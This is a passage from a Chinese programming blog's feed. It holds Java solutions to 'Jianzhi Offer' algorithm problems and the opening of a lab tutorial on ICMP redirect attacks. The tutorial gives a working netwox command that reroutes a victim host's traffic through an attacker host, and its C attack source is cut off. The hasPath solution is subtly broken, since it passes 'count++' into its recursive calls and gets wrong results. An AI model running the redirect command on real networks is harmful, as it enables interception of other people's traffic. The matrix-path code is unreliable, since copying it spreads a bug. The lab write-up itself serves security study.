title="题目描述"></a>题目描述</h4><blockquote><p>给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。例如，如果输入数组{2,3,4,2,6,2,5,1}及滑动窗口的大小3，那么一共存在6个滑动窗口，他们的最大值分别为{4,4,6,6,6,5}； 针对数组{2,3,4,2,6,2,5,1}的滑动窗口有以下6个： {[2,3,4],2,6,2,5,1}， {2,[3,4,2],6,2,5,1}， {2,3,[4,2,6],2,5,1}， {2,3,4,[2,6,2],5,1}， {2,3,4,2,[6,2,5],1}， {2,3,4,2,6,[2,5,1]}。</p><p>窗口大于数组长度的时候，返回空</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">maxInWindows</span><span class="params">(<span class="keyword">int</span>[] num, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">if</span> (size &gt; num.length || size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//窗口下标</span></span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//窗口上标</span></span><br><span class="line">        <span class="keyword">int</span> high = size - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//大顶堆</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; heap = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(Collections.reverseOrder());</span><br><span class="line">        <span class="comment">//初始化窗口，入堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = low; i &lt;= high; i++) &#123;</span><br><span class="line">            heap.offer(num[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//滑动窗口，获取每次窗口的最大值</span></span><br><span class="line">        <span class="keyword">while</span> (high &lt; num.length - <span class="number">1</span>) &#123;</span><br><span class="line">            res.add(heap.peek());</span><br><span class="line">            heap.remove(num[low]);</span><br><span class="line">            low++;</span><br><span class="line">            high++;</span><br><span class="line">            heap.offer(num[high]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取最后一个窗口的最大值</span></span><br><span class="line">        res.add(heap.peek());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="65-矩阵中的路径"><a href="#65-矩阵中的路径" class="headerlink" title="65.矩阵中的路径"></a>65.矩阵中的路径</h3><h4 id="标签：【dfs】【回溯】"><a href="#标签：【dfs】【回溯】" class="headerlink" title="标签：【dfs】【回溯】"></a>标签：【dfs】【回溯】</h4><h4 id="题目描述-64"><a href="#题目描述-64" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。 例如:</p><table><thead><tr><th style="text-align:center"><strong>a</strong></th><th style="text-align:center"><strong>b</strong></th><th style="text-align:center"><strong>c</strong></th><th style="text-align:center"><strong>e</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>s</strong></td><td style="text-align:center"><strong>f</strong></td><td style="text-align:center"><strong>c</strong></td><td style="text-align:center"><strong>s</strong></td></tr><tr><td style="text-align:center"><strong>a</strong></td><td style="text-align:center"><strong>d</strong></td><td style="text-align:center"><strong>e</strong></td><td style="text-align:center"><strong>e</strong></td></tr></tbody></table><p> 矩阵中包含一条字符串”bcced”的路径，但是矩阵中不包含”abcb”路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入该格子。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPath</span><span class="params">(<span class="keyword">char</span>[] matrix, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols, <span class="keyword">char</span>[] str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (matrix == <span class="keyword">null</span> || matrix.length == <span class="number">0</span> || rows &lt;= <span class="number">0</span> || cols &lt;= <span class="number">0</span> || str == <span class="keyword">null</span> || str.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//矩阵</span></span><br><span class="line">        <span class="keyword">char</span>[][] m = <span class="keyword">new</span> <span class="keyword">char</span>[rows][cols];</span><br><span class="line">        <span class="comment">//访问标记</span></span><br><span class="line">        <span class="keyword">int</span>[][] visit = <span class="keyword">new</span> <span class="keyword">int</span>[rows][cols];</span><br><span class="line">        <span class="comment">//矩阵初始化</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">                m[i][j] = matrix[i * cols + j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从m[i][j]出发搜索</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (find(m, rows, cols, str, i, j, count, visit)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span>[][] matrix, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols, <span class="keyword">char</span>[] str, <span class="keyword">int</span> srow, <span class="keyword">int</span> scol, <span class="keyword">int</span> count, <span class="keyword">int</span>[][] visit)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//已达到目标字符串的长度</span></span><br><span class="line">        <span class="keyword">if</span> (count &gt;= str.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (srow &gt;= rows || scol &gt;= cols || srow &lt; <span class="number">0</span> || scol &lt; <span class="number">0</span> || visit[srow][scol] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//置位访问标记</span></span><br><span class="line">        visit[srow][scol] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="comment">//当前位置的字符与目标字符一致，接着向上下左右四个方向继续搜索</span></span><br><span class="line">        <span class="keyword">if</span> (matrix[srow][scol] == str[count]) &#123;</span><br><span class="line">            flag = find(matrix, rows, cols, str, srow + <span class="number">1</span>, scol, count++, visit) ||</span><br><span class="line">                   find(matrix, rows, cols, str, srow - <span class="number">1</span>, scol, count++, visit) ||</span><br><span class="line">                   find(matrix, rows, cols, str, srow, scol + <span class="number">1</span>, count++, visit) ||</span><br><span class="line">                   find(matrix, rows, cols, str, srow, scol - <span class="number">1</span>, count++, visit);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//取消访问标记</span></span><br><span class="line">        visit[srow][scol] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="66-机器人的运动范围"><a href="#66-机器人的运动范围" class="headerlink" title="66.机器人的运动范围"></a>66.机器人的运动范围</h3><h4 id="标签：【数组】-10"><a href="#标签：【数组】-10" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-65"><a href="#题目描述-65" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>地上有一个m行和n列的方格。一个机器人从坐标0,0的格子开始移动，每一次只能向左，右，上，下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于k的格子。 例如，当k为18时，机器人能够进入方格（35,37），因为3+5+3+7 = 18。但是，它不能进入方格（35,38），因为3+5+3+8 = 19。请问该机器人能够达到多少个格子？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//格子数统计</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">movingCount</span><span class="params">(<span class="keyword">int</span> threshold, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (threshold &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//访问标记</span></span><br><span class="line">        <span class="keyword">int</span>[][] visit = <span class="keyword">new</span> <span class="keyword">int</span>[rows][cols];</span><br><span class="line">        find(threshold, rows, cols, <span class="number">0</span>, <span class="number">0</span>, visit);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//开始统计</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> threshold, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols, <span class="keyword">int</span> sr, <span class="keyword">int</span> sc, <span class="keyword">int</span>[][] visit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sr &gt;= rows || sr &lt; <span class="number">0</span> || sc &gt;= cols || sc &lt; <span class="number">0</span> || visit[sr][sc] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum(sr, sc) &gt; threshold) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//访问标记置位</span></span><br><span class="line">        visit[sr][sc] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//格子数加一</span></span><br><span class="line">        count++;</span><br><span class="line">        find(threshold, rows, cols, sr + <span class="number">1</span>, sc, visit);</span><br><span class="line">        find(threshold, rows, cols, sr - <span class="number">1</span>, sc, visit);</span><br><span class="line">        find(threshold, rows, cols, sr, sc + <span class="number">1</span>, visit);</span><br><span class="line">        find(threshold, rows, cols, sr, sc - <span class="number">1</span>, visit);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//计算数位之和</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> row, <span class="keyword">int</span> col)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sumR = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sumC = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (row != <span class="number">0</span>) &#123;</span><br><span class="line">            sumR += row % <span class="number">10</span>;</span><br><span class="line">            row /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (col != <span class="number">0</span>) &#123;</span><br><span class="line">            sumC += col % <span class="number">10</span>;</span><br><span class="line">            col /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sumR + sumC;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="67-剪绳子"><a href="#67-剪绳子" class="headerlink" title="67.剪绳子"></a>67.剪绳子</h3><h4 id="标签：【贪心】【数组】【数量关系】【高级算法】【组合数学】"><a href="#标签：【贪心】【数组】【数量关系】【高级算法】【组合数学】" class="headerlink" title="标签：【贪心】【数组】【数量关系】【高级算法】【组合数学】"></a>标签：【贪心】【数组】【数量关系】【高级算法】【组合数学】</h4><h4 id="题目描述-66"><a href="#题目描述-66" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给你一根长度为n的绳子，请把绳子剪成整数长的m段（m、n都是整数，n&gt;1并且m&gt;1，m&lt;=n），每段绳子的长度记为k[1],…,k[m]。请问k[1]x…xk[m]可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。</p><p>输入描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入一个数n，意义见题面。（2 &lt;= n &lt;= 60）</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>输出描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输出答案。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>示例1</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 8</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 18</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">cutRope</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//记录表</span></span><br><span class="line">        <span class="keyword">int</span>[] record = <span class="keyword">new</span> <span class="keyword">int</span>[target + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">//记录表初始化</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; target + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            record[i] = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> solve(target, record);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> target, <span class="keyword">int</span>[] record)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//剩余的长度在4及以下直接返回，最佳解是不再分割</span></span><br><span class="line">        <span class="keyword">if</span> (target &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> target;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//记录表中有纪录，直接返回，避免重复计算</span></span><br><span class="line">        <span class="keyword">if</span> (record[target] != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> record[target];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//自下而上，由子问题最优解得到问题的最优解</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target; i++) &#123;</span><br><span class="line">            max = Math.max(max, i * solve((target - i), record));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//子问题的最优解纪录到记录表中</span></span><br><span class="line">        record[target] = max;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;《剑指offer》刷题记录&quot;&gt;&lt;a href=&quot;#《剑指offer》刷题记录&quot; class=&quot;headerlink&quot; title=&quot;《剑指offer》刷题记录&quot;&gt;&lt;/a&gt;《剑指offer》刷题记录&lt;/h1&gt;&lt;h3 id=&quot;1-二维数组的查找&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="刷题" scheme="http://JKZhang.github.io/categories/%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="剑指offer" scheme="http://JKZhang.github.io/tags/%E5%89%91%E6%8C%87offer/"/>
    
      <category term="算法" scheme="http://JKZhang.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="刷题" scheme="http://JKZhang.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>信息安全实战——重定向攻击</title>
    <link href="http://JKZhang.github.io/2019/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E2%80%94ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"/>
    <id>http://JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/</id>
    <published>2019-04-03T16:07:52.000Z</published>
    <updated>2019-04-04T01:52:09.692Z</updated>
    
    <content type="html"><![CDATA[<p>说明：</p><p>攻击者主机 192.168.18.43</p><p>受害者主机 192.168.18.44</p><p>网关 192.168.18.254</p><p>一、Netwox命令实现重定向</p><p>1、查看主机ICMP重定向是否开启</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308429434.png" alt="1554308429434"></p><p>2、开启ICMP重定向</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308449789.png" alt="1554308449789"></p><p>3、目前在受害者主机上ping网址正常</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308476656.png" alt="1554308476656"></p><p>4、netwox 86 -f “host 192.168.18.44” -g 192.168.18.43 -i 192.168.18.254 命令执行后 ping包重定向</p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308488449.png" alt="1554308488449"></p><p>5、抓包</p><p> <img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308511264.png" alt="1554308511264"></p><p><img src="//JKZhang.github.io/2019/04/信息安全实战—ICMP重定向攻击/1554308579169.png" alt="1554308579169"></p><p>二、安装pcap</p><p>1、安装系统依赖包 </p><p>apt-get install gcc libc6-dev </p><p>apt-get install m4 </p><p>apt-get install flex bison</p><p>2、下载libpcap源码包 </p><p><a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org/</a></p><p>3、将libpcap源码包存放并解压到指定位置</p><p>tar -xf libpcap-1.9.0.tar.gz -C /usr/local/lib/libpcap/</p><p>4、编译安装 </p><p>./configure </p><p>make &amp;&amp; make install</p><p>5、可能需要在/etc/ld.so.conf 添加两行配置</p><p>改成如下 </p><p>include /etc/ld.so.conf.d/*.conf</p><p>include /usr/local/lib</p><p>include /usr/lib</p><p>三、ICMP重定向攻击源代码及分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span 